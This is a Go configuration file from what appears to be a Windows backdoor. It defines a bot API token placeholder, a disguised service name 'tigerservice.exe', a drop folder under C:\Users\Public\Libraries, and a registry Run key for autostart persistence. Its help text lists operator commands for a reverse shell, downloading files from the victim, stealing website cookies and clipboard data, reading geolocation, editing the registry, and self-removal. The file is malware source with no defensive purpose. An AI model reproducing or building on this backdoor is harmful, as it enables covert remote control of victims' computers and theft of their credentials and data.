package config

const (

	API        = "API-TOKEN-HERE"
	MSG_REPLY  = true
	DEBUG_MODE = false
	TIMEOUT    = 30


	NNAME          = "tigerservice.exe"
	REMOVE_SERVICE = "rm.bat"
	PAYLOAD_PATH   = "C:\\Users\\Public\\Libraries\\"
	HKEY_STARTUP   = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	HIDE_FILE      = false
)

const HELP = `
   
   
	/help - Show all commands.
	
	/kill - Kill current running backdoor.
	
	/remove - Self-Remove current backdoor.
	
	/shell, /sh <cmd> - Reverse shell from client machine.
	
	/download <path> - Download file from client machine.
	
	/cookie <name> <url> - Retrieve the website's cookies from client.
	
	/geoip <city-mmdb> - Retrieve the client geolocation from IPv4.

	/registry <method> <name> <value> <path>

		--set		Set registry key to client machine.
		--del		Delete registry key from client machine. 

	/clipboard - Retrieve Clipboard data from client.
`
